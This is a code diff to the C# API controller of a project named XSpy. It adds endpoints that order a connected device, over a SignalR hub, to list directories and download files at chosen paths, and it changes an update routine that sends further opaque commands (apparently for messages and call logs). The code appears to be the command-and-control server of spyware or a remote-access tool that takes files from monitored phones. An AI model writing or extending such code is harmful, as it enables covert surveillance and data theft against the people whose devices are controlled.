@@ -26,7 +26,51 @@ namespace XSpy.Controllers.Api
             _deviceService = deviceService;
         }
 
-        [Route("{deviceId}/update"), PreExecution]
+        [HttpGet("{deviceId}/isLoading"), PreExecution]
+        public async Task<IActionResult> IsDirLoaded(Guid deviceId)
+        {
+            var device = await _deviceService.GetDeviceById(deviceId);
+            if (device == null)
+                return NotFound();
+
+            return Ok(device.IsLoadingDir);
+        }
+        
+        [HttpGet("{deviceId}/dirs"), PreExecution]
+        public async Task<IActionResult> GetLoadedDirs(Guid deviceId)
+        {
+            var device = await _deviceService.GetPathsForDevice(deviceId);
+            if (device == null)
+                return NotFound();
+
+            return Ok(device);
+        }
+        
+        [HttpPost("{deviceId}/dir"), PreExecution]
+        public async Task<IActionResult> LoadDir([FromRoute] Guid deviceId, LoadPathRequest pathRequest)
+        {
+            var device = await _deviceService.GetDeviceById(deviceId);
+            if (device == null || string.IsNullOrEmpty(device.DeviceId))
+                return NotFound();
+
+            var connId = _methods.GetConnectionByDeviceId(device.DeviceId);
+            if (string.IsNullOrEmpty(connId))
+                return BadRequest();
+
+            var client = _hubContext.Clients.Client(connId);
+            if (client == null)
+                return BadRequest();
+
+            await client.SendAsync("0xFI", pathRequest.IsDir ? "ls" : "dl", pathRequest.Path);
+
+            device.IsLoadingDir = true;
+            _deviceService.Save(device);
+            await _deviceService.Commit();
+
+            return Ok(pathRequest);
+        }
+
+        [HttpGet("{deviceId}/update"), PreExecution]
         public async Task<IActionResult> RequestUpdate(Guid deviceId)
         {
             var device = await _deviceService.GetDeviceById(deviceId);
@@ -36,12 +80,16 @@ namespace XSpy.Controllers.Api
             var connId = _methods.GetConnectionByDeviceId(device.DeviceId);
             if (string.IsNullOrEmpty(connId))
                 return BadRequest();
-            
+
             var client = _hubContext.Clients.Client(connId);
             if (client == null)
                 return BadRequest();
-            
-            await client.SendAsync("0xFI");
+
+            device.IsLoadingDir = false;
+            _deviceService.Save(device);
+            await _deviceService.Commit();
+
+
             await client.SendAsync("0xSM", "ls", "", "");
 
             await client.SendAsync("0xCL");
